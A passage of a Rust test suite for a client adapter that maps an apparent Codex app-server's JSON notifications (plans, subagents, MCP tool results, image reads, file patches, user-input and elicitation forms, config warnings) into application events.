            )
            .await;
        assert!(
            matches!(events.try_recv().unwrap(), AgentEvent::Delta { kind: DeltaKind::AssistantText, text, .. } if text == "# Native plan")
        );
        actor
            .handle_notification(
                "item/completed",
                &json!({"threadId": "thread-1", "turnId": "turn-1", "completedAtMs": 2,
                "item": {"type": "plan", "id": "native-plan", "text": "# Final native plan"}}),
            )
            .await;
        assert!(
            matches!(events.try_recv().unwrap(), AgentEvent::ItemCompleted(ThreadItem { content: ItemContent::Plan { markdown }, .. }) if markdown == "# Final native plan")
        );
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn plan_notifications_map_to_events() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor
            .handle_notification(
                "turn/plan/updated",
                &json!({
                    "threadId": "thread-1",
                    "turnId": "turn-9",
                    "explanation": "  building  ",
                    "plan": [
                        {"step": "explore", "status": "completed"},
                        {"step": "build", "status": "inProgress"},
                        {"step": "verify", "status": "pending"}
                    ]
                }),
            )
            .await;
        match events.try_recv().unwrap() {
            AgentEvent::PlanUpdated {
                turn_id,
                explanation,
                steps,
            } => {
                assert_eq!(turn_id.as_deref(), Some("turn-9"));
                assert_eq!(explanation.as_deref(), Some("building"));
                assert_eq!(
                    steps
                        .iter()
                        .map(|step| (step.step.as_str(), step.status))
                        .collect::<Vec<_>>(),
                    [
                        ("explore", PlanStepStatus::Completed),
                        ("build", PlanStepStatus::InProgress),
                        ("verify", PlanStepStatus::Pending),
                    ]
                );
            }
            other => panic!("expected PlanUpdated, got {other:?}"),
        }
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn subagent_interaction_preserves_completion_until_work_restarts() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        for (index, (kind, expected)) in [
            ("started", ItemStatus::InProgress),
            ("interacted", ItemStatus::InProgress),
            ("completed", ItemStatus::Completed),
            ("interacted", ItemStatus::Completed),
            ("started", ItemStatus::InProgress),
            ("interrupted", ItemStatus::Interrupted),
            ("interacted", ItemStatus::Interrupted),
        ]
        .into_iter()
        .enumerate()
        {
            actor
                .handle_notification(
                    "item/completed",
                    &json!({"threadId": "thread-1", "turnId": "turn-1", "item": {
                        "type": "subAgentActivity", "id": format!("activity-{index}"),
                        "agentThreadId": "child", "agentPath": "/root/researcher",
                        "kind": kind
                    }}),
                )
                .await;
            let event = events.try_recv().unwrap();
            let (AgentEvent::ItemUpdated(item) | AgentEvent::ItemCompleted(item)) = event else {
                panic!("expected subagent snapshot");
            };
            assert!(
                matches!(item.content, ItemContent::Subagent { status, .. } if status == expected),
                "{kind} must preserve the child's actual work state: {item:?}"
            );
            assert!(events.try_recv().is_err());
        }
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

/// The lead's turn ends while the child it spawned still works, as
/// Codex 0.166 reports a spawn the model did not wait on: the spawn goes
/// on in the background, said once, and a child that has finished is not.
#[test]
fn a_subagent_a_completed_turn_left_running_goes_on_in_the_background() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        let activity = |id: &str, child: &str, kind: &str| {
            json!({"threadId": "thread-1", "turnId": "turn-1", "item": {
                "type": "subAgentActivity", "id": id,
                "agentThreadId": child, "agentPath": "/root/reply_ok",
                "kind": kind
            }})
        };
        for (id, child, kind) in [
            ("running", "child-a", "started"),
            ("done", "child-b", "started"),
            ("done-end", "child-b", "completed"),
        ] {
            actor
                .handle_notification("item/completed", &activity(id, child, kind))
                .await;
        }
        while events.try_recv().is_ok() {}
        let turn_completed =
            json!({"threadId": "thread-1", "turn": {"id": "turn-1", "status": "completed"}});
        for _ in 0..2 {
            actor
                .handle_notification("turn/completed", &turn_completed)
                .await;
        }
        let mut backgrounded = Vec::new();
        while let Ok(event) = events.try_recv() {
            if let AgentEvent::ItemBackgrounded {
                item_id,
                parent_item_id,
            } = event
            {
                assert_eq!(parent_item_id, None);
                backgrounded.push(item_id);
            }
        }
        assert_eq!(backgrounded, ["running"]);
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn subagent_labels_use_child_metadata_without_changing_lifecycle() {
    smol::block_on(async {
        for (kind, expected_status) in [
            ("started", ItemStatus::InProgress),
            ("completed", ItemStatus::Completed),
            ("interrupted", ItemStatus::Interrupted),
        ] {
            let (mut actor, events) = test_actor();
            actor
                .handle_command(SessionCommand::ApplySettings {
                    model: Some("gpt-6-astra".into()),
                    option_selections: vec![OptionSelection {
                        id: "reasoningEffort".into(),
                        value: json!("low"),
                    }],
                })
                .await
                .unwrap();
            assert!(matches!(
                events.try_recv().unwrap(),
                AgentEvent::SettingsApplied { applied: true }
            ));
            let activity = |kind| {
                json!({"threadId": "thread-1", "turnId": "turn-1", "item": {
                    "type": "subAgentActivity", "id": "spawn",
                    "agentThreadId": "child", "agentPath": "/root/header_mouse",
                    "kind": kind
                }})
            };
            actor
                .handle_notification("item/started", &activity("started"))
                .await;
            let event = events.try_recv().unwrap();
            assert!(
                matches!(
                    event,
                    AgentEvent::ItemUpdated(ThreadItem {
                        content: ItemContent::Subagent {
                            model: None,
                            effort: None,
                            ..
                        },
                        ..
                    })
                ),
                "unknown child metadata must not borrow the parent's model: {event:?}"
            );
            let request = sent(&mut actor).await;
            assert_eq!(request["method"], "thread/read");
            assert_eq!(
                request["params"],
                json!({"threadId": "child", "includeTurns": false})
            );
            if kind != "started" {
                actor
                    .handle_notification("item/completed", &activity(kind))
                    .await;
                while events.try_recv().is_ok() {}
            }
            actor
                .handle_line(
                    &json!({"id": request["id"], "result": {"thread": {
                        "id": "child", "model": "gpt-5.6-sol", "reasoningEffort": "high"
                    }}})
                    .to_string(),
                )
                .await;
            let AgentEvent::ItemUpdated(item) = events.try_recv().unwrap() else {
                panic!("expected label update");
            };
            assert_eq!(item.id, "spawn");
            assert_eq!(item.parent_item_id, None);
            assert!(matches!(item.content,
                ItemContent::Subagent { model: Some(model), effort: Some(effort), status, .. }
                if model == "gpt-5.6-sol" && effort == "high" && status == expected_status
            ));
            assert!(events.try_recv().is_err());
            if kind == "started" {
                actor
                    .handle_notification("item/completed", &activity("completed"))
                    .await;
                assert!(
                    matches!(events.try_recv().unwrap(), AgentEvent::ItemCompleted(ThreadItem {
                        content: ItemContent::Subagent { model: Some(model), effort: Some(effort), status: ItemStatus::Completed, .. }, ..
                    }) if model == "gpt-5.6-sol" && effort == "high")
                );
                assert!(events.try_recv().is_err());
            }
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        }
    });
}

#[test]
fn root_thread_activity_is_not_a_subagent() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        let root = actor.thread_id.clone();
        let activity = json!({"threadId": "thread-1", "turnId": "turn-1", "item": {
            "type": "subAgentActivity", "id": "act-root",
            "agentThreadId": root, "agentPath": "/root", "kind": "interacted"
        }});
        actor.handle_notification("item/started", &activity).await;
        actor.handle_notification("item/completed", &activity).await;
        assert!(
            events.try_recv().is_err(),
            "root activity must not emit a capsule"
        );
        assert!(
            written(&mut actor).await.is_empty(),
            "nor ask for a child's metadata"
        );
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

/// MCP results in the shape the app-server sends them (each `result` as
/// Tcode stores it, the image a 1x1 JPEG): the timeline keeps the text
/// the model read and moves image parts into `image_reads`, typed by their
/// bytes, whatever the tool.
#[test]
fn mcp_results_keep_their_text_and_move_images_into_image_reads() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        for line in include_str!("../../tests/fixtures/codex/mcp_tool_results.jsonl").lines() {
            actor.handle_line(line).await;
        }
        let mut completed = Vec::new();
        while let Ok(event) = events.try_recv() {
            if let AgentEvent::ItemCompleted(ThreadItem {
                content:
                    ItemContent::ToolCall {
                        name,
                        output,
                        image_reads,
                        status,
                        ..
                    },
                ..
            }) = event
            {
                let images: Vec<_> = image_reads
                    .iter()
                    .map(|image| (image.media_type.clone(), image.data_base64.len()))
                    .collect();
                completed.push((name, output.unwrap(), images, status));
            }
        }
        assert_eq!(
                completed,
                [
                    (
                        "cua_repl/js".to_owned(),
                        "The following is a diff from the previous accessibility tree for Window: \"\" with ~ and + representing changed and added elements, respectively. Removed elements are summarized by ID range.\nRemoved element IDs: 1-30\n+41 window Secondary Actions: Raise\nThe focused UI element is 41 window Secondary Actions: Raise".to_owned(),
                        vec![("image/jpeg".to_owned(), 216)],
                        ItemStatus::Completed,
                    ),
                    (
                        "cua_repl/js".to_owned(),
                        "Computer Use server error -10005: noWindowsAvailable".to_owned(),
                        vec![],
                        ItemStatus::Failed,
                    ),
                    (
                        "codex_apps/github.search_installed_repositories_v2".to_owned(),
                        "Action completed.\n{\"repositories\":[]}".to_owned(),
                        vec![],
                        ItemStatus::Completed,
                    ),
                ]
            );
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn image_reads_preserve_each_file_version() {
    smol::block_on(async {
        use base64::Engine as _;
        let (mut actor, events) = test_actor();
        let path =
            std::env::temp_dir().join(format!("tcode-image-read-{}.png", std::process::id()));
        let mut received = Vec::new();
        for (id, bytes) in [("first", b"first image"), ("later", b"later image")] {
            smol::fs::write(&path, bytes).await.unwrap();
            actor
                .handle_line(
                    &json!({"method":"item/completed", "params":{
                        "threadId":"thread-1", "item":{"type":"imageView", "id":id, "path":path}
                    }})
                    .to_string(),
                )
                .await;
            let AgentEvent::ItemCompleted(ThreadItem {
                content: ItemContent::ImageRead { image, .. },
                ..
            }) = events.try_recv().unwrap()
            else {
                panic!("image read");
            };
            received.push(image.expect("snapshot survives later overwrite"));
        }
        smol::fs::remove_file(&path).await.unwrap();
        actor
            .handle_line(
                &json!({"method":"item/completed", "params":{
                    "threadId":"thread-1", "item":{"type":"imageView", "id":"first", "path":path}
                }})
                .to_string(),
            )
            .await;
        let AgentEvent::ItemCompleted(ThreadItem {
            content: ItemContent::ImageRead { image, .. },
            ..
        }) = events.try_recv().unwrap()
        else {
            panic!("image read");
        };
        assert_eq!(
            image,
            Some(received[0].clone()),
            "completion retains the original read after deletion"
        );
        assert_eq!(
            base64::engine::general_purpose::STANDARD
                .decode(&received[0].data_base64)
                .unwrap(),
            b"first image"
        );
        assert_eq!(
            base64::engine::general_purpose::STANDARD
                .decode(&received[1].data_base64)
                .unwrap(),
            b"later image"
        );
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn a_login_shell_wrapper_is_stripped_from_commands_as_codex_shows_them() {
    for (reported, shown) in [
        (
            "/bin/zsh -lc 'sed -n 1,2p /etc/hosts'",
            "sed -n 1,2p /etc/hosts",
        ),
        (
            "bash -lc \"grep -rn 'fn main' src\"",
            "grep -rn 'fn main' src",
        ),
        ("python3 -c 'print(1)'", "python3 -c 'print(1)'"),
        ("/bin/zsh -lc 'ls' extra", "/bin/zsh -lc 'ls' extra"),
        ("zsh -lc 'unterminated", "zsh -lc 'unterminated"),
    ] {
        assert_eq!(shell_script(reported), shown, "{reported}");
    }
    let item = map_item(&json!({"type":"commandExecution","id":"cmd-2","command":"/bin/zsh -lc 'cargo check'","aggregatedOutput":"","status":"inProgress"})).unwrap();
    assert!(
        matches!(item.content, ItemContent::CommandExecution { command, .. } if command == "cargo check")
    );
}

#[test]
fn maps_core_item_kinds() {
    let command = map_item(&json!({"type":"commandExecution","id":"cmd-1","command":"pwd","aggregatedOutput":"/tmp\n","exitCode":0,"status":"completed"})).unwrap();
    assert!(matches!(
        command.content,
        ItemContent::CommandExecution {
            exit_code: Some(0),
            status: ItemStatus::Completed,
            ..
        }
    ));

    let file = map_item(&json!({"type":"fileChange","id":"patch-1","status":"completed","changes":[{"path":"hello.txt","kind":{"type":"add"},"diff":"+hi"}]})).unwrap();
    assert!(
        matches!(&file.content, ItemContent::FileChange { changes, .. } if changes[0].kind == FileChangeKind::Create)
    );

    let image =
        map_item(&json!({"type":"imageView","id":"image-1","path":"/tmp/screenshot.png"})).unwrap();
    assert!(
        matches!(image.content, ItemContent::ImageRead { path, .. } if path == "/tmp/screenshot.png")
    );

    let unknown = map_item(&json!({"type":"hookPrompt","id":"hook-1"})).unwrap();
    assert!(
        matches!(unknown.content, ItemContent::Other { ref provider_kind, .. } if provider_kind == "hookPrompt")
    );
}

/// A sleep and an image generation, as Codex sent them, arrive as the
/// calls a rollout records them as, of the families they are: the sleep
/// finished once it completes, the picture an image the call holds,
/// kept where Codex saved it.
#[test]
fn sleeps_and_image_generations_arrive_as_their_calls() {
    let sleep = json!({"type":"sleep","id":"call_000000000000000000000003","durationMs":20000});
    let call = |status| ItemContent::ToolCall {
        image_reads: Vec::new(),
        name: "sleep".into(),
        input: json!({"duration_ms": 20000}),
        output: None,
        status,
        family: Some(Box::new(ToolFamily::Wait {
            duration_ms: 20_000,
        })),
    };
    assert_eq!(
        lifecycle_item("item/started", &sleep).unwrap().content,
        call(ItemStatus::InProgress)
    );
    assert_eq!(
        lifecycle_item("item/completed", &sleep).unwrap().content,
        call(ItemStatus::Completed)
    );

    let picture = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
    let saved = "/home/user/.codex/generated_images/00000000-0000-7000-8000-000000000066/exec-00000000-0000-4000-8000-000000000067.png";
    let generation = json!({"type":"imageGeneration","id":"exec-00000000-0000-4000-8000-000000000067","status":"completed","revisedPrompt":"Edit the reference image: keep the subject, make the background transparent.","result":picture,"transparentBackground":true,"failure":null,"savedPath":saved,"inputImages":[{"path":"/home/user/project/assets/reference.png","sha256":"0000000000000000000000000000000000000000000000000000000000000001"}],"generationId":"00000000-0000-4000-8000-000000000068","startedAtMs":1_793_534_383_829_u64,"completedAtMs":1_793_534_414_873_u64});
    let generated = ItemContent::ToolCall {
        image_reads: vec![Attachment {
            media_type: "image/png".into(),
            data_base64: picture.into(),
            source_path: Some(saved.into()),
        }],
        name: "image_generation".into(),
        input: json!({
            "revised_prompt": "Edit the reference image: keep the subject, make the background transparent.",
            "input_images": ["/home/user/project/assets/reference.png"],
        }),
        output: None,
        status: ItemStatus::Completed,
        family: Some(Box::new(ToolFamily::ImageGeneration {
            prompt: Some(
                "Edit the reference image: keep the subject, make the background transparent."
                    .into(),
            ),
        })),
    };
    assert_eq!(
        lifecycle_item("item/completed", &generation)
            .unwrap()
            .content,
        generated
    );
}

#[test]
fn file_change_contents_become_unified_patches() {
    let item = map_item(&json!({
            "type": "fileChange", "id": "patch-content", "status": "completed",
            "changes": [
                {"path": "new.md", "kind": {"type": "add"}, "diff": "hello\n- list\n++literal\n\nlast"},
                {"path": "old.md", "kind": {"type": "delete"}, "diff": "hello\n"},
                {"path": "empty", "kind": {"type": "add"}, "diff": ""},
                {"path": "edit", "kind": {"type": "update", "move_path": null}, "diff": "@@ -1 +1 @@\n-old\n+new\n"}
            ]
        })).unwrap();
    let ItemContent::FileChange { changes, .. } = item.content else {
        panic!("file change")
    };
    assert_eq!(
        changes[0].diff.as_deref(),
        Some(
            "@@ -0,0 +1,5 @@\n+hello\n+- list\n+++literal\n+\n+last\n\\ No newline at end of file\n"
        )
    );
    assert_eq!(
        changes[1].diff.as_deref(),
        Some("@@ -1,1 +0,0 @@\n-hello\n")
    );
    assert_eq!(changes[2].diff.as_deref(), Some(""));
    assert_eq!(
        changes[3].diff.as_deref(),
        Some("@@ -1 +1 @@\n-old\n+new\n")
    );
}

#[test]
fn maps_reasoning_and_user_text() {
    let reasoning =
        map_item(&json!({"type":"reasoning","id":"r1","summary":["summary"],"content":["detail"]}))
            .unwrap();
    assert!(
        matches!(reasoning.content, ItemContent::Reasoning { ref text } if text == "summary\ndetail")
    );
    // Provider-echoed user messages are suppressed: the app synthesizes the
    // canonical UserMessage at send time, so mapping one here yields None
    // (no duplicate user bubble on replay/live).
    assert!(
            map_item(&json!({"type":"userMessage","id":"u1","content":[{"type":"text","text":"hello"},{"type":"image","url":"x"}]}))
                .is_none()
        );
}

#[test]
fn request_user_input_maps_questions_and_answer_wire_shape() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        // A question without options or a header is kept (options: []).
        actor
            .handle_line(
                &json!({
                    "id": 55,
                    "method": "item/tool/requestUserInput",
                    "params": {
                        "threadId": "thread-1", "turnId": "turn-1", "itemId": "item-1",
                        "isBlocking": true, "autoResolutionMs": null,
                        "questions": [
                            {
                                "id": "os",
                                "header": "Target",
                                "question": "macOS or Linux?",
                                "options": [
                                    {"label": "macOS", "description": "apple"}
                                ],
                                "isOther": true,
                                "isSecret": false
                            },
                            {
                                "id": "free", "header": "", "question": "Any notes?",
                                "isOther": false, "isSecret": false, "options": null
                            }
                        ]
                    }
                })
                .to_string(),
            )
            .await;

        match events.try_recv().unwrap() {
            AgentEvent::UserInputRequested {
                request_id,
                questions,
                ..
            } => {
                assert_eq!(request_id, "55");
                assert_eq!(questions.len(), 2);
                assert_eq!(questions[0].id, "os");
                assert_eq!(questions[0].options[0].label, "macOS");
                assert!(!questions[0].multi_select);
                // Free-text-only questions remain valid with empty options.
                assert_eq!(questions[1].id, "free");
                assert_eq!(questions[1].header, "");
                assert_eq!(questions[1].question, "Any notes?");
                assert!(questions[1].options.is_empty());
            }
            other => panic!("expected UserInputRequested, got {other:?}"),
        }

        // Answer: single string wraps into a 1-element array under {answers}.
        let mut answers = serde_json::Map::new();
        answers.insert("os".into(), json!("macOS"));
        answers.insert("free".into(), json!(["a", "b"]));
        actor
            .handle_command(SessionCommand::RespondUserInput {
                request_id: "55".into(),
                answers,
            })
            .await
            .unwrap();

        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::UserInputResolved { ref request_id, .. } if request_id == "55"
        ));
        let response = sent(&mut actor).await;
        assert_eq!(response["id"], 55);
        assert_eq!(
            response["result"]["answers"]["os"]["answers"],
            json!(["macOS"])
        );
        assert_eq!(
            response["result"]["answers"]["free"]["answers"],
            json!(["a", "b"])
        );

        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn elicitation_form_maps_fields_and_accepts_typed_content() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor
            .handle_line(
                &json!({
                    "id": 81,
                    "method": "mcpServer/elicitation/request",
                    "params": {
                        "serverName": "calendar",
                        "threadId": "thread-1",
                        "mode": "form",
                        "message": "Fill this in",
                        "requestedSchema": {
                            "type": "object",
                            "properties": {
                                "name": {"type": "string", "title": "Name"},
                                "age": {"type": "integer", "description": "Your age?"},
                                "active": {"type": "boolean"},
                                "choice": {
                                    "type": "string",
                                    "oneOf": [
                                        {"const": "wire-a", "title": "Choice A"},
                                        {"const": "wire-b", "title": "Choice B"}
                                    ]
                                },
                                "tags": {
                                    "type": "array",
                                    "items": {
                                        "anyOf": [
                                            {"const": "red-wire", "title": "Red"},
                                            {"const": "blue-wire", "title": "Blue"}
                                        ]
                                    }
                                },
                                "named": {
                                    "type": "string",
                                    "enum": ["wire-1", "wire-2"],
                                    "enumNames": ["First", "Second"]
                                },
                                "bare": {"type": "string", "enum": ["x", "y"]}
                            }
                        }
                    }
                })
                .to_string(),
            )
            .await;

        let AgentEvent::UserInputRequested {
            request_id,
            questions,
            ..
        } = events.try_recv().unwrap()
        else {
            panic!("expected UserInputRequested")
        };
        assert_eq!(request_id, "81");
        assert_eq!(
            questions
                .iter()
                .map(|question| question.id.as_str())
                .collect::<Vec<_>>(),
            ["name", "age", "active", "choice", "tags", "named", "bare"]
        );
        assert_eq!(questions[0].header, "calendar: Name");
        assert_eq!(questions[0].question, "Fill this in");
        assert!(questions[0].options.is_empty());
        assert!(!questions[0].multi_select);
        assert_eq!(questions[1].header, "calendar: age");
        assert_eq!(questions[1].question, "Your age?");
        assert!(questions[1].options.is_empty());
        assert!(!questions[1].multi_select);
        assert_eq!(questions[2].header, "calendar: active");
        assert_eq!(questions[2].question, "Fill this in");
        assert_eq!(
            questions[2]
                .options
                .iter()
                .map(|option| option.label.as_str())
                .collect::<Vec<_>>(),
            ["Yes", "No"]
        );
        assert!(!questions[2].multi_select);
        assert_eq!(questions[3].header, "calendar: choice");
        assert_eq!(questions[3].question, "Fill this in");
        assert_eq!(
            questions[3]
                .options
                .iter()
                .map(|option| option.label.as_str())
                .collect::<Vec<_>>(),
            ["Choice A", "Choice B"]
        );
        assert!(!questions[3].multi_select);
        assert_eq!(questions[4].header, "calendar: tags");
        assert_eq!(questions[4].question, "Fill this in");
        assert_eq!(
            questions[4]
                .options
                .iter()
                .map(|option| option.label.as_str())
                .collect::<Vec<_>>(),
            ["Red", "Blue"]
        );
        assert!(questions[4].multi_select);
        for (question, labels) in [
            (&questions[5], ["First", "Second"]),
            (&questions[6], ["x", "y"]),
        ] {
            assert_eq!(
                question
                    .options
                    .iter()
                    .map(|option| option.label.as_str())
                    .collect::<Vec<_>>(),
                labels
            );
            assert!(!question.multi_select);
        }

        let mut answers = serde_json::Map::new();
        answers.insert("name".into(), json!("Ada"));
        answers.insert("age".into(), json!("42"));
        answers.insert("active".into(), json!("Yes"));
        answers.insert("choice".into(), json!("Choice B"));
        answers.insert("tags".into(), json!(["Red", "Blue"]));
        answers.insert("named".into(), json!("Second"));
        answers.insert("bare".into(), json!("y"));
        actor
            .handle_command(SessionCommand::RespondUserInput {
                request_id: "81".into(),
                answers,
            })
            .await
            .unwrap();
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::UserInputResolved { ref request_id, .. } if request_id == "81"
        ));
        let response = sent(&mut actor).await;
        assert_eq!(
            response,
            json!({
                "id": 81,
                "result": {
                    "action": "accept",
                    "content": {
                        "active": true,
                        "age": 42,
                        "choice": "wire-b",
                        "name": "Ada",
                        "tags": ["red-wire", "blue-wire"],
                        "named": "wire-2",
                        "bare": "y"
                    }
                }
            })
        );
        assert!(response.get("error").is_none());

        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

/// An answer that does not fit the form's schema is not sent: the request
/// goes back to the user with the answers filled in, as ChatGPT.app 26.1103
/// keeps its form open ("Check this answer and try again"), and the
/// corrected answers are accepted. The request is `form` mode of
/// `v2/McpServerElicitationRequestParams.ts` of 0.167.0.
#[test]
fn elicitation_answer_that_does_not_fit_goes_back_to_the_user() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor
            .handle_line(
                &json!({
                    "id": 82,
                    "method": "mcpServer/elicitation/request",
                    "params": {
                        "threadId": "thread-1", "turnId": "turn-1",
                        "serverName": "numbers", "mode": "form", "_meta": null,
                        "message": "How many?",
                        "requestedSchema": {
                            "type": "object",
                            "properties": {
                                "count": {"type": "integer", "title": "Count"},
                                "note": {"type": "string", "title": "Note"}
                            },
                            "required": ["count"]
                        }
                    }
                })
                .to_string(),
            )
            .await;
        let _ = events.try_recv().unwrap();

        let respond = async |actor: &mut Actor, count: &str| {
            let mut answers = serde_json::Map::new();
            answers.insert("count".into(), json!(count));
            answers.insert("note".into(), json!("weekly"));
            actor
                .handle_command(SessionCommand::RespondUserInput {
                    request_id: "82".into(),
                    answers,
                })
                .await
                .unwrap();
        };
        respond(&mut actor, "1,000").await;
        assert!(written(&mut actor).await.is_empty());
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::Warning { message } if message.contains("numbers: Count")
        ));
        let AgentEvent::UserInputRequested {
            request_id,
            questions,
            ..
        } = events.try_recv().unwrap()
        else {
            panic!("expected the request again")
        };
        assert_eq!(request_id, "82");
        assert_eq!(
            questions
                .iter()
                .map(|question| question.prefill.as_deref())
                .collect::<Vec<_>>(),
            [Some("1,000"), Some("weekly")]
        );
        assert!(events.try_recv().is_err());

        respond(&mut actor, "1000").await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::UserInputResolved { ref request_id, .. } if request_id == "82"
        ));
        assert_eq!(
            sent(&mut actor).await,
            json!({"id": 82, "result": {"action": "accept",
                    "content": {"count": 1000, "note": "weekly"}}})
        );

        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn elicitation_url_cancels_or_accepts_without_content() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        for (id, answer, action) in [
            (83, "Cancel", "cancel"),
            (84, "I've opened the link", "accept"),
        ] {
            actor
                .handle_line(
                    &json!({
                        "id": id,
                        "method": "mcpServer/elicitation/request",
                        "params": {
                            "serverName": "oauth",
                            "threadId": "thread-1",
                            "mode": "url",
                            "elicitationId": format!("elicit-{id}"),
                            "message": "Authorize access",
                            "url": "https://example.test/authorize"
                        }
                    })
                    .to_string(),
                )
                .await;
            let AgentEvent::UserInputRequested { questions, .. } = events.try_recv().unwrap()
            else {
                panic!("expected UserInputRequested")
            };
            assert!(
                questions[0]
                    .question
                    .contains("https://example.test/authorize")
            );
            assert_eq!(questions[0].id, "url");

            let mut answers = serde_json::Map::new();
            answers.insert("url".into(), json!(answer));
            actor
                .handle_command(SessionCommand::RespondUserInput {
                    request_id: id.to_string(),
                    answers,
                })
                .await
                .unwrap();
            let _ = events.try_recv().unwrap();
            let response = sent(&mut actor).await;
            assert_eq!(response["result"]["action"], action);
            assert!(response["result"].get("content").is_none());
        }

        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn openai_form_elicitation_declines_with_result_and_warning() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor
            .handle_line(
                &json!({
                    "id": 85,
                    "method": "mcpServer/elicitation/request",
                    "params": {
                        "serverName": "opaque",
                        "threadId": "thread-1",
                        "mode": "openai/form",
                        "message": "Unsupported",
                        "requestedSchema": {"anything": true}
                    }
                })
                .to_string(),
            )
            .await;

        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::Warning { ref message }
                if message.contains("opaque") && message.contains("openai/form")
        ));
        let response = sent(&mut actor).await;
        assert_eq!(response["result"]["action"], "decline");
        assert!(response.get("result").is_some());
        assert!(response.get("error").is_none());
        assert!(!response.to_string().contains("-32601"));

        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

/// What Codex says outside a turn's items reaches the user in its own
/// words, and a configuration warning Codex repeats to the thread is shown
/// once. Shapes are `ConfigWarningNotification`, `WarningNotification`,
/// `DeprecationNoticeNotification` and
/// `McpServerStatusUpdatedNotification` of `ServerNotification.json`
/// (`codex app-server generate-json-schema --experimental`, codex-cli
/// 0.169.0); the content is invented.
#[test]
fn notices_outside_a_turn_reach_the_user_as_codex_gave_them() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        let ignored = "Codex is ignoring 1 unrecognized configuration setting.\n  \
                user (/home/user/.codex/config.toml): `quux` is ignored.";
        for line in [
            json!({"method": "configWarning", "params": {"summary": ignored, "details": null}}),
            json!({"method": "warning", "params": {"threadId": "thread-1", "message": ignored}}),
            json!({"method": "configWarning", "params": {
                    "summary": "Invalid configuration; using defaults.",
                    "details": "/home/user/.codex/config.toml:3:7: invalid type: integer `5`, expected a string",
                    "path": "/home/user/.codex/config.toml",
                    "range": {"start": {"line": 3, "column": 7}, "end": {"line": 3, "column": 7}}}}),
            json!({"method": "deprecationNotice", "params": {
                    "summary": "`[features].frob` is deprecated and ignored.",
                    "details": "Remove `frob` from [features] in config.toml."}}),
            json!({"method": "mcpServer/startupStatus/updated", "params": {
                    "name": "tracker", "status": "failed", "threadId": "thread-1",
                    "error": "MCP client for `tracker` failed to start: handshake refused",
                    "failureReason": null}}),
        ] {
            actor.handle_line(&line.to_string()).await;
        }
        let mut shown = Vec::new();
        while let Ok(event) = events.try_recv() {
            let AgentEvent::Warning { message } = event else {
                panic!("{event:?} is no warning");
            };
            shown.push(message);
        }
        assert_eq!(
            shown,
            [
                ignored,
                "Invalid configuration; using defaults.\n\
                        /home/user/.codex/config.toml:3:7: invalid type: integer `5`, expected a string",
                "`[features].frob` is deprecated and ignored.\n\
                        Remove `frob` from [features] in config.toml.",
                "MCP client for `tracker` failed to start: handshake refused",
            ]
        );
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn maps_fixture_envelopes_and_approval_response() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        for line in include_str!("../../tests/fixtures/codex/v2_messages.jsonl").lines() {
            actor.handle_line(line).await;
        }

        assert!(
            matches!(events.try_recv().unwrap(), AgentEvent::TurnStarted { ref turn_id } if turn_id == "turn-1")
        );
        assert!(
            matches!(events.try_recv().unwrap(), AgentEvent::ItemStarted(ThreadItem { content: ItemContent::FileChange { ref changes, status: ItemStatus::InProgress, .. }, .. }) if changes[0].kind == FileChangeKind::Create)
        );
        assert!(
            matches!(events.try_recv().unwrap(), AgentEvent::ApprovalRequested(ApprovalRequest { ref id, kind: ApprovalKind::FileChange { ref changes, .. }, .. }) if id == "41" && changes.len() == 1)
        );
        assert!(
            matches!(events.try_recv().unwrap(), AgentEvent::Delta { kind: DeltaKind::AssistantText, ref text, .. } if text == "PONG")
        );
        assert!(
            matches!(events.try_recv().unwrap(), AgentEvent::Delta { kind: DeltaKind::ReasoningText, ref text, .. } if text == "Checking")
        );
        assert!(
            matches!(events.try_recv().unwrap(), AgentEvent::Delta { kind: DeltaKind::CommandOutput, ref text, .. } if text == "ok\n")
        );
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::TokenUsage(TokenUsage {
                input_tokens: Some(8),
                cached_input_tokens: Some(2),
                output_tokens: Some(4),
                used_tokens: Some(12),
                total_processed_tokens: Some(123),
                context_window: Some(200000),
                ..
            })
        ));
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::ItemCompleted(ThreadItem {
                content: ItemContent::FileChange {
                    status: ItemStatus::Completed,
                    ..
                },
                ..
            })
        ));
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::TurnCompleted {
                status: TurnStatus::Completed,
                usage: Some(TokenUsage {
                    input_tokens: Some(8),
                    cached_input_tokens: Some(2),
                    output_tokens: Some(4),
                    used_tokens: Some(12),
